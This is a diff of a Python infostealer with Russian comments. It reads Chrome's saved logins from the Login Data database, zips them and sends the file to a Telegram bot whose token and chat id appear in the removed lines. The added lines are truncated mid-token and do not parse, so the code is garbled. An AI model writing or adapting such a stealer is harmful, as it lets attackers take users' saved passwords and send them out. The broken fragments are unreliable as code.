@@ -17,17 +17,14 @@ from PIL import ImageGrab
 
 username = os.getlogin()
 
-bot = Bot(token="5801854680:AAF-x-39udWG7Kfq9kuLgymUqd6b3ayk5TA")
+bot = Bot(tok
 storage=MemoryStorage()
 dp = Dispatcher(bot, storage=storage)
 
 
 def Chrome(): # Создаём функцию
     text = 'Passwords Chrome:' + '\n' # Добавим авторов стиллера)
-    text += 'URL | LOGIN | PASSWORD' + '\n' # Объясняем что лог идём в формате Ссылка | Логин | Пароль
-    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'): # Ищем файл Login Data В котором содержатся все пароли
-        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
-
+    text += 'URL | LOGIN
         conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2') # Начинаем работать с sqlite базой
         cursor = conn.cursor()
         cursor.execute('SELECT action_url, username_value, password_value FROM logins') # Вытаскиваем Ссылку, логин, пароль
@@ -50,7 +47,7 @@ newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\google_pass.txt')
 doc = 'D:\LOG.zip'
 
 
-bot.send_document(1070910655, (doc, file))
+bot.send_document, (doc, file))
 
 
 
